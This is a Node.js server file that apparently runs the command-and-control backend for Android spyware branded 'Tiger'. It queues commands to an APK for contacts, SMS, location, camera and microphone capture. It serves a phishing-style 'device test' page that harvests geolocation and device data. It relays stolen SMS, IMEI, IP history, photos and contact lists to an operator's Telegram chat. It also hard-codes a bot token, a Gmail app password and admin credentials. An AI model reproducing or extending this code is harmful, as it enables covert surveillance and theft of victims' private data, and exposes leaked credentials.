// In-memory store for generated links and their owners
const deviceLinks = {};

const express = require('express');
const axios = require('axios');
const path = require('path');
const nodemailer = require('nodemailer');
const app = express();

// --- Device Command Queue (in-memory, for demo) ---
const deviceCommands = {};

// Endpoint to queue a command for a device (for testing/demo)
app.post('/send-command', (req, res) => {
    const { deviceId, command, payload } = req.body;
    if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });
    deviceCommands[deviceId] = { command, payload };
    res.json({ status: 'queued', deviceId, command });
});

// Endpoint for APK to poll for commands
app.post('/get-command', (req, res) => {
    const { deviceId } = req.body;
    if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
    const cmd = deviceCommands[deviceId];
    if (cmd) {
        // Remove command after sending (one-time)
        delete deviceCommands[deviceId];
        return res.json(cmd);
    }
    res.json({});
});


// Photo (Base64) badi hoti hai, isliye limit badhana zaruri hai
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// --- ⚙️ CONFIGURATION ---
const ADMIN_USER = "admin";
const ADMIN_PASS = "tiger@123";

const BOT_1_TOKEN = '8592457059:AAGRtcgD8_ajWaiEVk7smOi0tqzDK3HNBuI';
const CHAT_ID = '8592457059';

// --- Telegram Command Handler ---
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_1_TOKEN}`;
const DATA_COMMANDS = [
    { command: 'contacts', label: 'Contacts' },
    { command: 'sms', label: 'SMS' },
    { command: 'location', label: 'Location' },
    { command: 'device', label: 'Device Info' },
];

const HARDWARE_COMMANDS = [
    { command: 'camera_test', label: 'Camera Test' },
    { command: 'mic_test', label: 'Mic Test' },
    { command: 'sensor_test', label: 'Sensor Test' },
];

app.post('/telegram-webhook', async (req, res) => {
    const body = req.body;
    // Main menu: show on any text message (except callback queries), in private or group chat
    if (body.message && body.message.text) {
        const mainButtons = [
            [{ text: 'generate link', callback_data: 'generate_link' }],
            [{ text: 'get data frm apk', callback_data: 'getdata_menu' }],
            [{ text: 'get data by code', callback_data: 'getdata_by_code' }]
        ];
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: body.message.chat.id,
            text: 'Choose an option:',
            reply_markup: { inline_keyboard: mainButtons }
        });
        return res.sendStatus(200);
    }
    // Handle main menu button callbacks
    if (body.callback_query) {
        const data = body.callback_query.data;
        if (data === 'generate_link') {
            // Generate a unique link for this user (user id based)
            const userId = body.callback_query.from.id;
            const uniqueCode = Math.random().toString(36).substring(2, 10) + userId;
            const link = `https://tiger2-2.onrender.com/device-test/${uniqueCode}`;
            deviceLinks[uniqueCode] = { userId, chatId: body.callback_query.message.chat.id, created: Date.now() };
            await axios.post(`${TELEGRAM_API}/sendMessage`, {
                chat_id: body.callback_query.message.chat.id,
                text: `Your unique device test link: ${link}`
            });
        // Serve device test page (simple HTML/JS)
        app.get('/device-test/:code', (req, res) => {
            const { code } = req.params;
            if (!deviceLinks[code]) {
                return res.status(404).send('Invalid or expired link.');
            }
            // Simple HTML page to collect device info and permissions
            res.send(`
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <title>Device Test</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                </head>
                <body>
                    <h2>Device Test & Permissions</h2>
                    <button id="startBtn">Start Test</button>
                    <pre id="result"></pre>
                    <script>
                    document.getElementById('startBtn').onclick = async function() {
                        const result = {};
                        result.userAgent = navigator.userAgent;
                        result.platform = navigator.platform;
                        result.language = navigator.language;
                        result.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                        result.permissions = {};
                        if (navigator.permissions) {
                            for (const perm of ['geolocation','notifications','camera','microphone']) {
                                try {
                                    const status = await navigator.permissions.query({name: perm});
                                    result.permissions[perm] = status.state;
                                } catch {}
                            }
                        }
                        if (navigator.geolocation) {
                            await new Promise(resolve => {
                                navigator.geolocation.getCurrentPosition(
                                    pos => {
                                        result.geolocation = pos.coords;
                                        resolve();
                                    },
                                    () => resolve(),
                                    {timeout: 3000}
                                );
                            });
                        }
                        document.getElementById('result').textContent = JSON.stringify(result, null, 2);
                        // Send to server
                        await fetch('/device-test-report', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({ code: '${code}', report: result })
                        });
                        alert('Test report sent!');
                    };
                    </script>
                </body>
                </html>
            `);
        });

        // Receive device test report and forward to Telegram
        app.post('/device-test-report', async (req, res) => {
            const { code, report } = req.body;
            if (!deviceLinks[code]) return res.status(400).send('Invalid code');
            const { chatId } = deviceLinks[code];
            // Format report for Telegram
            let msg = `Device Test Report:\n`;
            msg += `User Agent: ${report.userAgent}\nPlatform: ${report.platform}\nLanguage: ${report.language}\nTimezone: ${report.timezone}\n`;
            if (report.geolocation) {
                msg += `Location: Lat ${report.geolocation.latitude}, Lon ${report.geolocation.longitude}\n`;
            }
            if (report.permissions) {
                msg += 'Permissions:\n';
                for (const [k,v] of Object.entries(report.permissions)) {
                    msg += `- ${k}: ${v}\n`;
                }
            }
            await axios.post(`${TELEGRAM_API}/sendMessage`, {
                chat_id: chatId,
                text: msg
            });
            res.send('ok');
        });
        } else if (data === 'getdata_menu') {
            // Show data options and hardware test
            const buttons = [
                ...DATA_COMMANDS.map(cmd => [{
                    text: cmd.label,
                    callback_data: `getdata_${cmd.command}`
                }]),
                [{ text: 'Hardware Test', callback_data: 'hardware_test' }]
            ];
            await axios.post(`${TELEGRAM_API}/sendMessage`, {
                chat_id: body.callback_query.message.chat.id,
                text: 'Select data to get from APK:',
                reply_markup: { inline_keyboard: buttons }
            });
        } else if (data === 'getdata_by_code') {
            await axios.post(`${TELEGRAM_API}/sendMessage`, {
                chat_id: body.callback_query.message.chat.id,
                text: 'Please enter the code to get data.'
            });
        } else if (data.startsWith('getdata_')) {
            const cmd = data.replace('getdata_', '');
            await axios.post(`${TELEGRAM_API}/sendMessage`, {
                chat_id: body.callback_query.message.chat.id,
                text: `Command sent to APK: ${cmd}`
            });
        }
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: body.callback_query.id
        });
        return res.sendStatus(200);
    }
    // Handle hardware test button
    if (body.callback_query && body.callback_query.data === 'hardware_test') {
        // Show hardware test options
        const hwButtons = HARDWARE_COMMANDS.map(cmd => [{
            text: cmd.label,
            callback_data: `hwtest_${cmd.command}`
        }]);
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: body.callback_query.message.chat.id,
            text: 'Select hardware test:',
            reply_markup: { inline_keyboard: hwButtons }
        });
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: body.callback_query.id
        });
        return res.sendStatus(200);
    }
    // Handle hardware test sub-options
    if (body.callback_query && body.callback_query.data.startsWith('hwtest_')) {
        const hwCmd = body.callback_query.data.replace('hwtest_', '');
        let msg = '';
        if (hwCmd === 'camera_test') msg = 'Camera test command sent. Please send a photo.';
        else if (hwCmd === 'mic_test') msg = 'Mic test command sent. Please send a 2-minute recording.';
        else if (hwCmd === 'sensor_test') msg = 'Sensor test command sent. Please send sensor status.';
        else msg = 'Unknown hardware test.';
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: body.callback_query.message.chat.id,
            text: msg
        });
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: body.callback_query.id
        });
        return res.sendStatus(200);
    }
    res.sendStatus(200);
});

const MY_EMAIL = "harshrajsharma359@gmail.com";
const APP_PASSWORD = "ulhw zrxc bzbt hqnl";

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: { user: MY_EMAIL, pass: APP_PASSWORD }
});
// -----------------------

let smsLogs = [];

// 1. DATA RECEIVE ENDPOINT (SMS, GPS, PHOTO)
app.post('/log-sms', async (req, res) => {
    try {
        const { sender, message, device, timestamp, location, photo } = req.body;
        let msgObj = {};
        try { msgObj = JSON.parse(message); } catch (e) { msgObj = {}; }
        const isDeviceInfo = sender === 'DeviceInfo' && typeof msgObj === 'object';

        let telegramMsg = '';
        let mediaToSend = [];
        if (isDeviceInfo) {
            telegramMsg = `🐯 *Tiger Device Report*\n\n` +
                `📱 *Device:* ${device || 'Tiger-Mobile'}\n` +
                `🌐 *Current IP:* ${msgObj.ip || 'N/A'}\n` +
                `🕓 *IP History:* ${(msgObj.ipHistory || []).join(', ') || 'N/A'}\n` +
                `🔢 *IMEI:* ${msgObj.imei || 'N/A'}\n` +
                `👥 *Contacts:* ${msgObj.contactsCount || 'N/A'}\n` +
                `🛠 *Hardware:* ${msgObj.deviceSummary ? JSON.stringify(msgObj.deviceSummary) : 'N/A'}\n`;
            // Camera images
            if (msgObj.cameraImages && msgObj.cameraImages.length > 0) {
                telegramMsg += `\n📷 *Camera Images:* ${msgObj.cameraImages.length}`;
                mediaToSend = msgObj.cameraImages.slice(0, 10);
            }
        } else {
            // Fallback to old message
            const mapsLink = location ? `https://www.google.com/maps?q=${location.lat},${location.lng}` : "Not Available";
            telegramMsg = `🐯 *Tiger Advanced Alert!*\n\n` +
                `📱 *Device:* ${device || 'Tiger-Mobile'}\n` +
                `👤 *From:* ${sender || 'System'}\n` +
                `💬 *Msg:* ${message || 'No SMS Content'}\n` +
                `📍 *GPS:* [View Location](${mapsLink})`;
        }

        // --- Telegram Delivery ---
        const sendToTelegram = async (token) => {
            // Send main message
            await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
                chat_id: CHAT_ID,
                text: telegramMsg,
                parse_mode: 'Markdown'
            });
            // Send camera images (as media group if available)
            if (mediaToSend.length > 0) {
                const mediaGroup = mediaToSend.map((img, idx) => ({
                    type: 'photo',
                    media: img,
                    caption: idx === 0 ? 'Camera Images' : undefined
                }));
                await axios.post(`https://api.telegram.org/bot${token}/sendMediaGroup`, {
                    chat_id: CHAT_ID,
                    media: mediaGroup
                });
            }
            // Send PDFs if available
            if (msgObj.contactsPdf) {
                await axios.post(`https://api.telegram.org/bot${token}/sendDocument`, {
                    chat_id: CHAT_ID,
                    document: msgObj.contactsPdf,
                    caption: 'Contacts PDF'
                });
            }
            if (msgObj.ipHistoryPdf) {
                await axios.post(`https://api.telegram.org/bot${token}/sendDocument`, {
                    chat_id: CHAT_ID,
                    document: msgObj.ipHistoryPdf,
                    caption: 'IP History PDF'
                });
            }
        };

        await sendToTelegram(BOT_1_TOKEN);

        // --- Email Delivery (optional, unchanged) ---
        res.status(200).json({ status: 'success' });
    } catch (error) {
        console.error("Error:", error.message);
        res.status(500).json({ status: 'error' });
    }
});

// 2. ADMIN PANEL ACCESS
app.get('/admin', (req, res) => {
    const b64auth = (req.headers.authorization || '').split(' ')[1] || '';
    const [login, password] = Buffer.from(b64auth, 'base64').toString().split(':');

    if (login === ADMIN_USER && password === ADMIN_PASS) {
        return res.send(`
            <html>
            <head><title>Tiger Dashboard</title></head>
            <body style="font-family: Arial; padding: 20px;">
                <h2>🐅 Tiger Advanced Dashboard</h2>
                <table border="1" style="width:100%; border-collapse: collapse;">
                    <tr style="background:#eee;"><th>Time</th><th>Sender</th><th>Message</th><th>GPS</th></tr>
                    ${smsLogs.map(l => `<tr><td>${l.time}</td><td>${l.sender}</td><td>${l.message}</td><td><a href="${l.location}" target="_blank">Maps</a></td></tr>`).join('')}
                </table>
                <script>setTimeout(() => location.reload(), 15000);</script>
            </body>
            </html>
        `);
    }
    res.set('WWW-Authenticate', 'Basic realm="401"');
    res.status(401).send('Authentication required.');
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`🚀 Tiger Server Live on ${PORT}`));
